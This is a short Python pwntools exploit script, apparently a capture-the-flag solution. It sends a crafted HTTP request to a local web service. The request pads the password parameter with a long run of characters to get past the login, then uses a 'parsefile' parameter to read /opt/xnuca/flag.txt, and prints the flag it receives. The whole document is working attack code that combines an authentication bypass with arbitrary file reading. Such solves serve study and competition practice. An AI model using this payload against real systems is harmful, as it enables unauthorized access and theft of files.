from pwn import *
p = remote("127.0.0.1",8080)
buf= '''GET /login.html?username=admin&password=admin111111111111111111111111111111111111111111111111111111nimda&menu=parsefile&para=/opt/xnuca/flag.txt HTTP/1.1
Host: 127.0.0.1:8080
Proxy-Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Credentials: LG GRAM'''
context.log_level = 'debug'
p.send(buf)
p.recvuntil('Try login in me.!\\r\\n\n')
flag = p.recvline()[:-1]
print '[+] flag:',flag
p.interactive()